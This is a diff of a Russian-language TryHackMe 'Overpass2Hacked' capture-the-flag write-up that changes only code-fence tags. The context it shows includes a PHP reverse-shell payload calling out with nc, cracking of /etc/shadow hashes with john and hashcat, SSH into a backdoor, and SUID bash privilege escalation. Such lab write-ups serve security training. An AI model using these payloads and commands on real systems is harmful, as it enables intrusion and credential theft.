@@ -38,7 +38,7 @@ http история обращений `ip.src==192.168.170.145 && http` выг�
 ![http](screenshots/03.http.png)
 
 В форму загрузки файлов, загружается **payload.php**, содержащий **reverse  shell**  
-```
+```bash
 <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
 ```
 ![reverse](screenshots/04.reverse.png)
@@ -55,7 +55,7 @@ http история обращений `ip.src==192.168.170.145 && http` выг�
 ![ssh-backdoor](screenshots/07.ssh-backdoor.png)
 
 john взломал 4 пароля, полученных злоумышленником из **/etc/shadow**
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Easy - Overpass2Hacked/files]
 └─$ cat hash.txt          
 james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
@@ -107,7 +107,7 @@ func passwordHandler(_ ssh.Context, password string) bool {
 ![hash](screenshots/08.hash.png)
 
 Для взлома hash вначале определяю тип  
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Easy - Overpass2Hacked/files]
 └─$ hashid "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed"
 Analyzing '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed'
@@ -121,14 +121,14 @@ Analyzing '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e37
 ```
 
 Для **SHA-512** в **hashcat** нужно использовать **1700**  
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Easy - Overpass2Hacked/files]
 └─$ hashcat -m 1700 -a 0 hash-attack.txt /media/sf_Exchange/Dictionaries/rockyou.txt 
 hashcat (v6.2.6) starting
 ```
 
 Но это не даст результат, т.к. нужно добавить **salt** и тогда использовать код **1710**  
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Easy - Overpass2Hacked/files]
 └─$ echo "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" > hash-attack.txt
 
@@ -147,7 +147,7 @@ hashcat (v6.2.6) starting
 ![ssh](screenshots/09.ssh.png)
 
 nmap показывает, что порт открыт  
-```
+```bash
 PORT     STATE SERVICE VERSION                                                                                     
 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                
 | ssh-hostkey: 
@@ -173,7 +173,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 Подключаюсь по ssh  
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Easy - Overpass2Hacked/scans]
 └─$ ssh james@10.10.52.76 -p 2222
 Unable to negotiate with 10.10.52.76 port 2222: no matching host key type found. Their offer: ssh-rsa
@@ -193,7 +193,7 @@ james@overpass-production:/home/james/ssh-backdoor$
 ```
 
 Получаю пользовательский флаг
-```
+```bash
 james@overpass-production:/home/james$ ls -la
 total 1136
 drwxr-xr-x 7 james james    4096 Jul 22  2020 .
@@ -219,7 +219,7 @@ thm{d119b4fa8c497ddb0525f7ad200e6567}
 ## ⚙️ Привилегии
 
 Ищу векторы повышения привилегий
-```
+```bash
 james@overpass-production:/home/james$ sudo -l
 [sudo] password for james: 
 Sorry, try again.
@@ -253,7 +253,7 @@ llmes@overpass-production:/home/james$ find / -type f -perm -04000 -ls 2>/dev/nu
 ```
 
 Повышаю привилегии
-```
+```bash
 james@overpass-production:/home/james$ ./.suid_bash 
 .suid_bash-4.4$ id
 uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
